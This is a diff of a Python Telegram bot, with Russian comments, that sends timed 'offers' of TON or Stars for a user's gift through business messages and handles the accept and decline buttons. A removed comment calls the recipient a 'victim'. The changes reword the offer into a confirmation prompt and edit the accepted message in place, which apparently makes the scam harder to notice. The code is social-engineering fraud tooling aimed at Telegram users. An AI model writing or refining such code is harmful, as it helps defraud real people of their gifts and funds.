@@ -81,7 +81,6 @@ def style(text: str) -> str:
     out.append(_style_plain(tail) if depth == 0 else tail)
     return "".join(out)
 
-
 # ============ БАЗОВЫЕ ФУНКЦИИ ============
 
 def esc(s):
@@ -212,20 +211,19 @@ def left_text(seconds):
     h, m = divmod(minutes, 60)
     return f"{h} ч. {m} мин." if h else f"{m} мин."
 
-# Текст ПРЕДОФФЕРА (который видит жертва до нажатия)
+# ============ ТЕКСТЫ ============
+
 def preoffer_text(o):
     if o.get("currency") == "TON":
         addr_text = f" на ваш адрес <code>{esc(o['address'])}</code>" if o.get("address") else ""
         amount = f"{num(o['amount'])} TON"
-        text = (f"<b>{maker_label(o)}</b> предлагает Вам <b>{amount}</b>{addr_text} за подарок {gift_link(o)}.\n\n"
+        return (f"Вы точно хотите отправить сделку на {gift_link(o)} за <b>{amount}</b>{addr_text}?\n\n"
                 f"Предложение действует ещё {left_text(o['expires'] - time.time())}")
     else:
         amount = f'{num(o["amount"])} звёзд'
-        text = (f"<b>{maker_label(o)}</b> предлагает Вам <b>{amount}</b> за подарок {gift_link(o)}.\n\n"
+        return (f"Вы точно хотите отправить сделку на {gift_link(o)} за <b>{amount}</b>?\n\n"
                 f"Предложение действует ещё {left_text(o['expires'] - time.time())}")
-    return text
 
-# Текст ПОСЛЕ нажатия "Принять"
 def accepted_text(o):
     u = o["maker"]
     username = u.get("username") or "пользователя"
@@ -276,6 +274,8 @@ def accepted_kb(o):
         ]
     }
 
+# ============ ЛОГИКА ============
+
 async def make_offer(m, maker, bcid, currency="STARS"):
     cmd, _, arg = (m.get("text") or "").partition(" ")
     parsed, error = parse_offer(arg)
@@ -303,14 +303,13 @@ async def make_offer(m, maker, bcid, currency="STARS"):
         save()
         # 2. Ждем 3 секунды
         await asyncio.sleep(3)
-        # 3. Редактируем точку в ПРЕДОФФЕР (с кнопками Отклонить/Принять)
+        # 3. Редактируем точку в ПРЕДОФФЕР
         await edit_offer(o, preoffer_text(o), preoffer_kb(o), preview=True)
     else:
         desc = res.get("description", "")
         if "PEER_FLOOD" not in desc:
             log.error(f"Ошибка при создании оффера: {desc}")
 
-# ВОЗВРАЩАЕМ ФУНКЦИЮ SWEEPER
 async def sweeper():
     while True:
         await asyncio.sleep(60)
@@ -357,20 +356,10 @@ async def on_callback(q):
             return await api("answerCallbackQuery", callback_query_id=q["id"], text="Срок предложения истёк", show_alert=True)
             
         if action == "ok":
-            # Удаляем предоффер и отправляем НОВОЕ сообщение "Сделка принята"
-            try:
-                await delete_business_message(o["bcid"], o["mid"])
-            except Exception:
-                pass
-            
+            # ИЗМЕНЯЕМ СООБЩЕНИЕ В КАРТОЧКУ ОФФЕРА (без удаления)
             o["status"] = "accepted"
             save()
-            
-            res = await send(o["chat"], accepted_text(o), accepted_kb(o), bcid=o["bcid"], preview=True)
-            if res.get("ok"):
-                o["mid"] = res["result"]["message_id"]
-                save()
-                
+            await edit_offer(o, accepted_text(o), accepted_kb(o), preview=True)
             await api("answerCallbackQuery", callback_query_id=q["id"])
         else:
             # Просто удаляем сообщение
